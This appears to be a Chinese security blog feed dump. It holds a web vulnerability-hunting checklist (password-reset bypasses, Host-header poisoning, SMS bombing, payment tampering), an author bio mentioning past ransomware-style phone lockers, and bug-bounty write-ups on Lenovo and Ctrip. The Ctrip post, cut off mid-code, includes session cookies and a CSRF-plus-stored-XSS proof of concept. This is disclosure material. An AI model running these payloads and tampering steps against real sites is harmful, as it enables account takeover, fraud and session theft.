title="手机号码找回"></a>手机号码找回</h4><ol><li><p>输入520xxx后网站会对520xxx发送一条验证码，此时可以查看一下数据包中或者返回的数据包中是否存在此验证码，</p></li><li><p>输入正确的手机号码和验证码，然后抓包查看返回值，然后替换到想任意重置的用户的数据返回包中，查看是否能够成功的绕过从而重置密码</p></li><li><p>如果验证码是4位的，且有效时间过长是可以选择爆破的。</p></li><li><p>自己加入一下数据，假设<code>www.a.com</code>在修改用户数据的时候会传递一个值（<code>user_name</code>），然后我们在忘记密码处输入正确的手机号码和验证码，并且再重置成功的最后一步参数添加<code>user_name=admin</code>，如果这里是有接受<code>user_name</code>的值的话并且处理的话，你就可以重置<code>admin</code>用户的账号密码了。</p></li><li><p>查看每一步操作，比如<strong>第一步</strong>是验证手机号码是否正确，<strong>第二步</strong>是填写新密码，那么我们在<strong>第一步</strong>输入正确的手机号码（<code>1511...</code>）-&gt;点击获取验证码-&gt;输入正确的验证码，然后到达<strong>第二步</strong>的时候填写新的密码然后抓包（放到<code>Repeater</code>模块里）。然后我们再回到第一步，输入<code>17520...</code>的手机号码-&gt;点击获取验证码（不用输入验证码，因为你也获取不到其他用户的验证码），然后我们在<code>Repeater</code>模块中点击<code>1511...</code>用户输入新密码的那个数据包的<code>GO</code>，如果可以重置就表示没有判断第一步就可以执行第二步了，但是这里有一点是注意的，如果手机号码和验证码存在第二步中，那么这个方法就不会有效。</p></li><li><p>见过最多的是找回密码的token是base64编码的，而解码后的明文根据其规则修改就可以成为别人用户找回密码的凭证了。</p></li></ol><h4 id="邮箱账号找回"><a href="#邮箱账号找回" class="headerlink" title="邮箱账号找回"></a>邮箱账号找回</h4><ol><li><p>HOST头伪造：输入正确的邮箱账号，但是修改 HOST（也就是发送的域名） ，比如修改为<code>www.iamfree.com</code>（如果这里没有过滤的话，邮箱里发送的内容就会是<code>www.iamfree.com/xxx重置密码链接xxx</code>），然后<code>www.iamfree.com</code>网站的功能就是存储每个访问的请求，那么我们就可以获取到重置密码的请求，从而来重置用户的账号，但是如果用户过了链接重置的有效期才点击的话，这个漏洞就会很难利用了。</p></li><li><p>其余同手机号码找回漏洞原理差不多。</p></li></ol><h4 id="注册用户处"><a href="#注册用户处" class="headerlink" title="注册用户处"></a>注册用户处</h4><ol><li>这里的话也和手机找回密码处逻辑差不多，但是不同的是任意用户注册的话手机号码是存在的，而任意用户注册的话是手机号码不存在，并且可以不用输入正确的手机号码验证码就可绕过。</li></ol><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>没挖过</p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>没挖过</p><h3 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h3><h4 id="图形类验证码绕过"><a href="#图形类验证码绕过" class="headerlink" title="图形类验证码绕过"></a>图形类验证码绕过</h4><ol><li><p>验证码刷新之后，而历史刷新的验证码还是可以继续使用。</p></li><li><p>验证码使用过后不刷新，时效性不过期，可以一直复用。</p></li><li><p>很多验证码的显示很简单，容易被机器识别。</p></li></ol><h4 id="短信类验证码绕过"><a href="#短信类验证码绕过" class="headerlink" title="短信类验证码绕过"></a>短信类验证码绕过</h4><ol><li><p><strong>验证码过于简易&amp;接口未限制</strong>：有些手机短信验证码都为 4-8位 纯数字的验证码，在接口没有任何限制的情况下是可以直接爆破的</p></li><li><p><strong>验证码发送复用&amp;时效性过长&amp;接口未限制</strong>：位数验证码时效性为5分钟，但是在这里同一手机号发送的验证码都是一样的，所以可以在4分钟的时候重新发送一次验证码这样验证码就又有效了，因为验证码一直在被复用，所以可以爆破。</p></li><li><p><strong>万能验证码</strong>：这是很多大企业的诟病，在未上线前为了方便测试加了<code>888888</code>、<code>000000</code>这样的万能验证码但是上线后没去删除测试的3内容导致被恶意利用。</p></li></ol><h3 id="短信-语音验证码重放"><a href="#短信-语音验证码重放" class="headerlink" title="短信/语音验证码重放"></a>短信/语音验证码重放</h3><blockquote><p>无论是发送短信还是语音验证码来做验证，都是需要手机号的，而发送验证码实际上是需要成本的，需要跟运营商或者是第三方验证码平台进行合作，多数验证码为0.01元一条，当然也有更便宜的，所以这边的问题也会影响到一个企业的资产方面。</p></blockquote><ol><li><p>厂商对验证码发送这一块并没有进行限制时间发送，可造成短信轰炸</p></li><li><p>很多厂商会对手机号进行限制，如果60秒内发送过就不会发送，但是程序员在设计代码层的逻辑时会出现很多奇葩的问题，例如其为了方便用户体验，正常的代码层的流程为：去除用户手误输入的空格以及一些特殊符号 -&gt; 验证手机号是否发送过验证码。</p><p> 某些程序员会这样设计流程： 验证手机号是否发送过验证码（发送过则不放行 没发送过则进入下一步） -&gt; 去除用户手误输入的空格以及一些特殊符号 -&gt; 发送手机号验证码</p></li></ol><ol start="3"><li><strong>手机号可遍历发送</strong>：验证码发送会影响到企业资产，那么发送验证码限制就不能仅仅针对于单一手机号的限制，例如我可以载入一堆手机号的字典，然后直接遍历发送验证码，这也是危害之一。</li></ol><h3 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h3><ol><li><p>查看是否是<code>IIS6.0</code>等搭建的，因为如果是这些服务器搭建的话我们是可以通过解析漏洞或者00截断来上传我们想要上传的文件</p></li><li><p>如果只是前端判断上传的文件后缀名的话，我们可以用<code>Burp</code>来绕过</p></li><li><p>如果是只判断了HTTP/HTTPS的请求包中的<code>Content-type</code>我们就只需要修改为合法的就可以上传了。</p></li><li><p>更多（待续）</p></li></ol><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>比如一个后台，是需要正确的管理员密码才能登陆（废话），那么未授权访问就是说不需要用户名和密码即可登陆后台。</p><ol><li>比如你输入账号密码后服务端会判断账号密码是否正确，如果登陆成功，照常访问，如果登陆失败的话就会用前段的跳转强制让你回到首页，那么我们可以抓包的时候修改返回值，如果返回值是html代码的话，找到跳转的链接，将其删除，如果是状态码这些，将类似的<code>Error</code>修改为<code>Success</code>，总之看情况的。</li></ol><h3 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h3><blockquote><p>基本上大站是不存在这个漏洞的，除非个把程序员想要去祭天</p></blockquote><ol><li><p>比如购买iamfree这个产品的时候，需要99999999999元，那么我们在点击购买的时候，尝试修改99999999999元为1元后放包，查看是否能购买成功</p></li><li><p>比如在购买iamfree的时候，都会弹出一个是否购买成功然后选项是购买成功，另一个选项是购买失败，那么我们什么都不要点击，因为这样子的肯定是有空多长时间重新请求的，我们就可以打开代理，并且开启抓包模式，等又发起请求的时候，我们可以修改请求包中的返回值为正确购买的（多修改试试）</p></li><li><p>如果商品的价格是不能改的话我们可以试试这个思路：一般购买商品的话是存在优惠券的，比如我购买iamfree的时候需要200元，而优惠券就是满200优惠10元的，那么可以-&gt;选择这个优惠卷-&gt;抓包，查看数据包里是否有可以的参数的值为10为199，那么这个时候如果没有验证优惠券的价格的话就会变成1元钱（200-199=1，我只是为了声明，并没有怀疑你们的智商= ~~ =）就可以购买了。</p></li><li><p>如果以上都不成功的话还是别放弃，查看一下网站是否存在退款功能，比如我购买了10元的产品，那么还没发货的时候我们可以点击退款，但是退款中，数据包中包含那个10，那么我们可以尝试一下把10修改为1000，然后查看一下自己的钱是否有变多~</p></li><li><p>还是退款功能，我们抓取数据包后，放到<code>Repeater</code>模块中，一直点GO，虽然我也不知道原理，但是记得有看文章看到过，反正如果添加了你的余额就可以了。</p></li><li><p>修改商品数量</p></li><li><p><strong>sign值可逆：</strong> sign多数为对比确认金额的一段内容，很多都是md5加密的，这时候你要做好自己的分析明文到底是什么，然后去碰撞，例如可能是md5(订单号+金额)这样的的组合，然后修改金额重新生成sign就可以绕过金额固定的限制了。</p></li></ol><h3 id="通用操作绕过"><a href="#通用操作绕过" class="headerlink" title="通用操作绕过"></a>通用操作绕过</h3><ol><li>假设某个步骤1的<code>URL</code>为<code>http://www.iamfree.com/do1</code>，这时候可以尝试修改下链接为<code>/do2</code>等类似的<code>URL</code>的来测试是否能绕过第一步来进行第二步的操作。</li></ol><h3 id="条件竞争-HTTP并发"><a href="#条件竞争-HTTP并发" class="headerlink" title="条件竞争(HTTP并发)"></a>条件竞争(HTTP并发)</h3><ol><li>在签到、转账、兑换、购买等场景是最容易出现这样的问题。比如当你点击签到的时候，抓包，然后放到<code>Repeater</code>模块里，一直点击<code>GO</code>，如果程序员没有做严格的过滤的话，我们点击的<code>签到、转账、兑换、购买</code>的次数会随着<code>GO</code>的次数增加，而且不会消耗另外的东西。</li></ol><h3 id="任意URL跳转漏洞"><a href="#任意URL跳转漏洞" class="headerlink" title="任意URL跳转漏洞"></a>任意URL跳转漏洞</h3><p>这里以途牛为例（马赛克走起）</p><p><img src="http://static.zybuluo.com/1kbfree/82etcgp78wa9cxddl2507sck/image_1ci1jsh76han1cbvm0jenvaud19.png" alt="image_1ci1jsh76han1cbvm0jenvaud19.png-86.2kB"></p><p>他这里的<code>murl</code>就是跳转到哪儿的链接，但是被限制了（目测是正则，但是正则这东西很容易绕过的，不相信继续看下去）</p><p><img src="http://static.zybuluo.com/1kbfree/m3qaf7ts388spf33tebasl4u/image_1ci1k65ij1qvf7br13e3gv6duk26.png" alt="image_1ci1k65ij1qvf7br13e3gv6duk26.png-129.1kB"></p><p>我们输入一下<code>https://www.我们的url.com/?www.途牛url.com</code></p><p><img src="http://static.zybuluo.com/1kbfree/53dzezrpirj31mfuvmq5091s/image_1ci1k923m12evj45p8j1ut4mlk2j.png" alt="image_1ci1k923m12evj45p8j1ut4mlk2j.png-103.3kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – 0DafSafe</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;如果你有更好的思路可以找我说一下，感激不尽~&lt;br&gt;后续将继续补充(前提是有思路分享给我)，还需要大佬们的多多支持~&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="Iamfree(作者)" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/Iamfree-%E4%BD%9C%E8%80%85/"/>
    
    
      <category term="Web漏洞挖掘思路" scheme="127.0.0.1/tags/Web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/"/>
    
  </entry>
  
  <entry>
    <title>about_me</title>
    <link href="127.0.0.1/2018/07/05/about-me/"/>
    <id>127.0.0.1/2018/07/05/about-me/</id>
    <published>2018-07-05T10:07:01.000Z</published>
    <updated>2018-07-05T10:11:04.252Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>害羞不给看 哈哈哈:)</p></blockquote><a id="more"></a><h3 id="First、"><a href="#First、" class="headerlink" title="First、"></a>First、</h3><p>Thank~ 承蒙看得起</p><h3 id="2016年"><a href="#2016年" class="headerlink" title="2016年"></a>2016年</h3><p>记得那年暑假的时候，爱上了玩手机，然后也喜欢打游戏，不知不觉中就知道了存在那么一个软件，他叫<strong>葫芦娃</strong>，里面有一个社区记得那里面很多都是分享软件的，如 破解过的小游戏、免费看VIP电影、免流等，然后我就天天喜欢在这里下载一下软件用，可是，，，直到有一天，我下载一个游戏破解器的时候，就下载了一个锁机软件（普遍入坑剧情），里面挂着 V字仇杀队的图片，写着:<br><code>hacker by xxxx</code><br>，我很慌张，因为手机是我妈妈的，然后我当时也不知道是哪里借的钱，发给了锁机作者（20元，那个时候对我来说就是要命啊），然后那个锁机的作者不但没有给我解锁，还说还变成他徒弟（30元）才可以帮忙解锁，可是我那个时候是真的没那么多钱，我就一直在求他，结果就是他屏蔽我了，钱也没退还。然后到最后面也没解决，还是拿去手机店才给恢复的。</p><p>经过上次那个事情后，我一直记在心里面，直到有一天偷跑去网吧上网后，我去搜索了一下hacker by关键词，发现有很多个，然后我打开了几个，发现页面上全是炫酷的文字炫酷的英语炫酷的背景（黑页），瞬间觉得帅气吊炸天，然后又去搜索什么黑客什么入侵之类的，我发现是真的喜欢。然后回到家后，就拿我妈手机喊着学黑客什么的，然后然后买了一本书，《黑客入门到精通》，但是买了没怎么看，其中原因是我在封闭式学校读书没时间可以看，但是我心目中就是留下一个印象，然后到快上初二的时候，经过某些事情（复杂说不清），我也开始学着做锁机（AIDE写的锁机源码然后修改一些信息就变成我的了，哈哈哈）然后也是到处发给别人，然后不知道怎么地就满满的加入了各大黑客群（娱乐圈），并且每天装逼，吹牛逼，日复一日的过着，然后有一天那个群主找了我给我当了管理员（因为我老是偷源码改源码然后别人问我锁机是怎么搞的我都说我做的），然后有一天，某个大黑客进了群，在闹场，说打黑客技术，打五项之类的，然后那个群主（因为他只会搞安卓开发）就喊我（我每天吹牛说我是黑客。。。。）来和他比比试试，我当时就结巴了，不知道如何回答。。。。 然后我就找借口说我在工作，过几天吧，然后这几天我就疯狂的在看一些黑客知识，然后学来学去只会用 啊D，御剑、穿山甲 我发现根本没希望打赢，我就默默的退群了，也换了个QQ号，觉得自己以后都不能再装逼了，打脸的感觉实在太痛了。</p><h3 id="2017年"><a href="#2017年" class="headerlink" title="2017年"></a>2017年</h3><p>在这一年里，也并没有接触安全这行业，而是接触的前端开发~（我也不知道我怎么就接触到前端的，估计是黑页太炫酷了） 然后我就在学html，css，javascript（没怎么学），jquery，也写出过某官网首页，虽然是惨不忍睹，但是很有自豪感。可是这种感觉并不长久，因为自己太花心，但是又有人说易语言多么厉害可以写电脑锁机软件，我又跑去学，然后那个时候又了解到Python和Ruby语言很厉害，当黑客必备，我就又跑去学了，这次学的比较久，可能是Py语言比较好玩把，但是我只是每个星期的星期日才能去网吧玩电脑（封闭式学校，星期一到星期六都要上课），然后发现自己学的并不怎么好，还是放弃了，直到新年的时候，我正在的想去接触安全，因为当时看了什么 网络安全人才培养（其中内容就是可以去什么大学之类的） 这些，我发现我自己是不是也可以去学一学说不定我可以不用成绩（我成绩很差。。）考就去那些好的大学读书呢，然后还是拖到了18年</p><h3 id="2018年"><a href="#2018年" class="headerlink" title="2018年"></a>2018年</h3><p>在这一年里，因为随着生理成长以及一些生活上的困惑后我内心成长了不少（这让我非常开心，因为看清了现在要做的事情）</p><p>然后就是在一月份的时候，我去学习了Web安全，经过了几个月的时间学习（过程省略。。因为多半时间又在吹牛逼），发现自己的确是学的不少了，令我最开心的是，在学习渗透的时候，遇到了许多志同道合的人，愿意一起努力，一起成长。然后经过一段时间的磨练后，我也尝试在漏洞盒子上挖掘一些漏洞（也就是半个月前），然后第一个挖掘的漏洞就是联想的Csrf漏洞，我但是是真的乐坏了，又拿着截图到处装逼去，因为喜欢上了挖到漏洞的感觉（优越感、自豪感、可装逼感），这里我引入一句HackOne的白帽子的一句话：<strong>开心去玩耍，大胆去尝试，不要尝试模仿别人或一心只想成功，因为如果这是属于你的Bug，你总会发现的，在这个过程中，你会得到更多的乐趣。</strong></p><p>接着就在最近的时间里（其中休息了4天）不断的挖掘（运气非常好），我挖到了有<code>1.1k</code>，如图<br><img src="http://static.zybuluo.com/1kbfree/ral9zsa1a2iq04d3kxexcuwa/image_1chktj5avoje1gu212mt159u10a69.png" alt="image_1chktj5avoje1gu212mt159u10a69.png-32.3kB"><br>这让我非常的开心，所以我也希望在未来的日子里可以挖掘到更多的漏洞，并且离我的梦想更近一步。</p><h3 id="学习阻扰"><a href="#学习阻扰" class="headerlink" title="学习阻扰"></a>学习阻扰</h3><p>其实学习阻扰还是挺多的。</p><p>1、因为家里是在农村，科技并不发达，早期时间爸妈还是很针对我学这个的，但是因为我的坚持不懈，他们现在不支持我学也没办法了，事实证明坚持下来还是有用的</p><p>2、同学们不理解，经常对我冷嘲热讽，但是无所谓，毕竟这些事情是看结果的</p><p>3、还是因为家里是农村并且没什么钱，所以想去参加一些会议也是凉凉的</p><p>4、就是到目前的时期，感觉自己不知道再学习什么好，感觉处于瓶颈期，如果大佬们愿意，可以多来帮忙指导我一下，万分感谢。</p><h3 id="座右铭"><a href="#座右铭" class="headerlink" title="座右铭"></a>座右铭</h3><p>十年寒窗无人问，一举成名天下知</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;害羞不给看 哈哈哈:)&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>漏洞挖掘经验|联想商城某处存在ID越权授权</title>
    <link href="127.0.0.1/2018/06/22/%E8%81%94%E6%83%B3%E5%95%86%E5%9F%8E%E6%9F%90%E5%A4%84%E5%AD%98%E5%9C%A8ID%E8%B6%8A%E6%9D%83%E6%8E%88%E6%9D%83/"/>
    <id>127.0.0.1/2018/06/22/联想商城某处存在ID越权授权/</id>
    <published>2018-06-22T08:29:07.000Z</published>
    <updated>2018-07-10T08:29:02.180Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部文章，禁止转载！</p></blockquote><a id="more"></a><p>漏洞URL：<a href="https://account.lenovo.com/us/zh/requestaccess" target="_blank" rel="noopener">https://account.lenovo.com/us/zh/requestaccess</a></p><h5 id="我们需要注册一个账号，然后进入上述漏洞网址-如图"><a href="#我们需要注册一个账号，然后进入上述漏洞网址-如图" class="headerlink" title="我们需要注册一个账号，然后进入上述漏洞网址,如图"></a>我们需要注册一个账号，然后进入上述漏洞网址,如图</h5><p><img src="http://static.zybuluo.com/1kbfree/2qy45ucvnlrwvwhrz28dbc14/image_1cgj98rg81a4vmtlmko15kb1il629.png" alt="image_1cgj98rg81a4vmtlmko15kb1il629.png-297.2kB"></p><h5 id="我们在这里我们随便输入BID，然后用burp抓包。"><a href="#我们在这里我们随便输入BID，然后用burp抓包。" class="headerlink" title="我们在这里我们随便输入BID，然后用burp抓包。"></a>我们在这里我们随便输入BID，然后用burp抓包。</h5><p><img src="http://static.zybuluo.com/1kbfree/8j11jhnhht9n06eqmt0jq1fd/1.png" alt="1.png">  </p><h5 id="抓取返回包。"><a href="#抓取返回包。" class="headerlink" title="抓取返回包。"></a>抓取返回包。</h5><p><img src="http://static.zybuluo.com/1kbfree/flxct6ouz7h064rteflwdbat/2.png" alt="2.png">  </p><h5 id="把参数Statecode-1改为statecode-1"><a href="#把参数Statecode-1改为statecode-1" class="headerlink" title="把参数Statecode=-1改为statecode=1"></a>把参数<code>Statecode=-1</code>改为<code>statecode=1</code></h5><p><img src="http://static.zybuluo.com/1kbfree/06vpr3qdsuiptv91nanqzobs/3.png" alt="3.png">  </p><h5 id="Forward放包"><a href="#Forward放包" class="headerlink" title="Forward放包"></a>Forward放包</h5><p><img src="http://static.zybuluo.com/1kbfree/ftydy0bne3c7inrw1j6kfyfr/4.png" alt="4.png">  </p><p><em>这样的话无论我们输入BID为何值都没有用了，因为已经显示 <code>ID is already authorized</code> ，意思为该ID已经被授权。</em></p><blockquote><p>这个漏洞最主要的就是授权的时候只判断了 <code>ID</code> 的返回结果，所以导致了 <code>越权漏洞</code> 的参数</p></blockquote><p>这里吐槽一下，联想审核的第一次拒绝了我，然后我申诉，给我过了，我以为是个高危，没想到审核说<strong>越权行为已经确认产生，但是越权产生的危害不能确认，因此判定为越权行为为中风险</strong>，有点扎心</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;内部文章，禁止转载！&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="内部资料" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="作者(一条快乐的咸鱼)" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/Web%E6%94%BB%E9%98%B2/%E4%BD%9C%E8%80%85-%E4%B8%80%E6%9D%A1%E5%BF%AB%E4%B9%90%E7%9A%84%E5%92%B8%E9%B1%BC/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="越权漏洞" scheme="127.0.0.1/tags/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="实战渗透" scheme="127.0.0.1/tags/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>携程发游记处存在Csrf+存储Xss漏洞</title>
    <link href="127.0.0.1/2018/06/21/%E6%90%BA%E7%A8%8B%E5%8F%91%E6%B8%B8%E8%AE%B0%E5%A4%84%E5%AD%98%E5%9C%A8Csrf-%E5%AD%98%E5%82%A8Xss%E6%BC%8F%E6%B4%9E/"/>
    <id>127.0.0.1/2018/06/21/携程发游记处存在Csrf-存储Xss漏洞/</id>
    <published>2018-06-21T12:48:33.000Z</published>
    <updated>2018-07-10T08:27:53.309Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>声明：内部文章,禁止转载!</p><p>继上篇 <code>携程某处存在Json格式的Csrf漏洞发游记</code> 写完后，又挖到一个 <code>Xss</code> (某大佬提醒的),然后造成了组合拳~</p></blockquote><a id="more"></a><blockquote><p>URL -&gt; <a href="http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals" target="_blank" rel="noopener">http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals</a></p></blockquote><h4 id="打开URL后，页面如图"><a href="#打开URL后，页面如图" class="headerlink" title="打开URL后，页面如图"></a>打开URL后，页面如图</h4><p><img src="http://static.zybuluo.com/1kbfree/al09v6gv8wew83rdl4wldxu2/image_1cgh4l305int10hdkfn1pfh4489.png" alt="image_1cgh4l305int10hdkfn1pfh4489.png-483.5kB"></p><h4 id="点击上图的写游记"><a href="#点击上图的写游记" class="headerlink" title="点击上图的写游记"></a>点击上图的写游记</h4><p><img src="http://static.zybuluo.com/1kbfree/j11j045f8xz72nmpw04kvvrd/image_1cggtlmfhq3l50r8in147aifum.png" alt="image_1cggtlmfhq3l50r8in147aifum.png-146.8kB"><br><em>点击后会进入另一个页面，如下图</em></p><h4 id="点击发布"><a href="#点击发布" class="headerlink" title="点击发布"></a>点击发布</h4><p><img src="http://static.zybuluo.com/1kbfree/7md936r409zlyh8ss369f99o/image_1cggtnrtg4h315d2174oi771rm413.png" alt="image_1cggtnrtg4h315d2174oi771rm413.png-80.9kB"><br><em>又又又还有一个页面</em></p><h4 id="选好后点击提交并且抓包"><a href="#选好后点击提交并且抓包" class="headerlink" title="选好后点击提交并且抓包"></a>选好后点击提交并且抓包</h4><p><img src="http://static.zybuluo.com/1kbfree/otd02a8z2x31i1j2udrolgco/image_1cggtquogas41v4c7keeju1p7p1g.png" alt="image_1cggtquogas41v4c7keeju1p7p1g.png-99.4kB"></p><p>抓取的数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /TravelSite/Member/SaveNewTravel HTTP/1.1</span><br><span class="line">Host: you.ctrip.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://you.ctrip.com/TravelSite/Member/EditNewTravel?travelId=3689502</span><br><span class="line">Content-Length: 508</span><br><span class="line">Cookie: _bfa=1.1529559162771.3aowri.1.1529564159709.1529575803710.3.139; adscityen=Meizhou; _RF1=120.239.228.99; _RSG=T6KJObxFMeEUqcn7NtwLW8; _RDG=2885568a6cac882bb818690bc2de21a339; _RGUID=ea163fb9-584d-419d-8815-eb75c7c66d1e; _jzqco=%7C%7C%7C%7C1529559191059%7C1.113394883.1529559190871.1529579192824.1529579227556.1529579192824.1529579227556.undefined.0.0.31.31; __zpspc=9.3.1529576375.1529579227.12%234%7C%7C%7C%7C%7C%23; MKT_Pagesource=PC; _bfi=p1%3D290606%26p2%3D290606%26v1%3D139%26v2%3D137; login_uid=92A18FCF669DF32698BF54DD2CE7E1D1; login_type=0; UUID=1508E76B015E4E609698BCA0B9CA2320; IsPersonalizedLogin=T; appFloatCnt=1; manualclose=1; ASP.NET_SessionSvc=MTAuOC4xODkuNjB8OTA5MHxqaW5xaWFvfGRlZmF1bHR8MTUyNjUzNzExNDI2Mw; bdshare_firstime=1529559824392; _abtest_userid=a62eb7c0-4054-48fa-8421-eaae213957d6; ASP.NET_SessionId=tcktpejhlxfokmlnf1q1zn3j; _bfs=1.41; cticket=1C81168DBA3550FFB18DE9387721086ADC29F177C61F3FCDDEC332A0F561FEA1; ticket_ctrip=bJ9RlCHVwlu1ZjyusRi+ypZ7X2r4+yojO82DkiXyGYeP0Mg96gJEQ+LWMo18plOrPdkAeXYih6tqb1Y94QwsvBuemHYmTAK0dmQ8i4jhcqKgOgeTp2vPOL0poU5JHB7aZMn8dLj1VWnc06YYBrgW94hk8E69pgP+7xG9aEMLIjSajqQw9nQHaiqeULn6n6AWdH6Nx5wwmPYV+vaMlu4TmQRy40no+qH6nW0v79DvqWom85pWMuKY4cNlH+KZ0DFagL1nXMWbTg4m8Yq5UtJ0aAvGpE4MsXq6PXfRNy1Vkmc=; AHeadUserInfo=VipGrade=0&amp;UserName=&amp;NoReadMessageCount=0; DUID=u=08F36DBB6DC5886589DDBB5100AD9461&amp;v=0; IsNonUser=F</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;Content&quot;:&quot;&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;&quot;,&quot;Title&quot;:&quot;11111&quot;,&quot;UploadPicContent&quot;:&quot;&quot;,&quot;CoverImageId&quot;:0,&quot;TravelId&quot;:&quot;3689502&quot;,&quot;CoverLocationY&quot;:0,&quot;ClassifiedInfo&quot;:&#123;&quot;DistrictList&quot;:[&#123;&quot;DistrictId&quot;:&quot;110000&quot;,&quot;DistrictName&quot;:&quot;ä¸­å½ï¼äºæ´²&quot;,&quot;IsSelected&quot;:true&#125;,&#123;&quot;DistrictId&quot;:&quot;1&quot;,&quot;DistrictName&quot;:&quot;111111&gt;&quot;,&quot;IsSelected&quot;:true&#125;],&quot;TagList&quot;:[],&quot;TravelId&quot;:&quot;3689502&quot;,&quot;ClassifiedType&quot;:6,&quot;TravelDays&quot;:1111111111,&quot;DepartureDate&quot;:&quot;2018-06-13&quot;,&quot;Consume&quot;:111,&quot;CompanionType&quot;:1&#125;,&quot;PublishStatus&quot;:1&#125;</span><br></pre></td></tr></table></figure></p><p><em>可以看到这里是由 <code>Json</code> 传递的，并且没有 <code>Token</code> 之类的验证，那么就可能会存在 <code>Csrf</code></em> </p><h4 id="我们将其构造成-Csrf-Poc-这里还存在存储Xss，打包在如下POC"><a href="#我们将其构造成-Csrf-Poc-这里还存在存储Xss，打包在如下POC" class="headerlink" title="我们将其构造成 Csrf Poc,这里还存在存储Xss，打包在如下POC:"></a>我们将其构造成 <code>Csrf Poc</code>,这里还存在<code>存储Xss</code>，打包在如下<code>POC</code>:</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://you.ctrip.com/TravelSite/Member/SaveNewTravel"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"Content":"&lt;h1&gt;test&lt;/h1&gt;&lt;img src=x onerror=alert(\"cookie\")&gt;","UploadPicContent":"","CoverImageId":0,"TravelId":"3689502","CoverLocationY":0,"ClassifiedInfo":&#123;"DistrictList":[&#123;"DistrictId":"110000","DistrictName":"涓浗锛屼簹娲�","IsSelected":true&#125;,&#123;"DistrictId":"1","DistrictName":"111111&gt;","IsSelected":true&#125;],"TagList":[],"TravelId":"3689502","ClassifiedType":6,"TravelDays":1111111111,"DepartureDate":"2018-06-13","Consume":111,"CompanionType":10&#125;,"PublishStatus":1,"Title":"love you'</span> <span 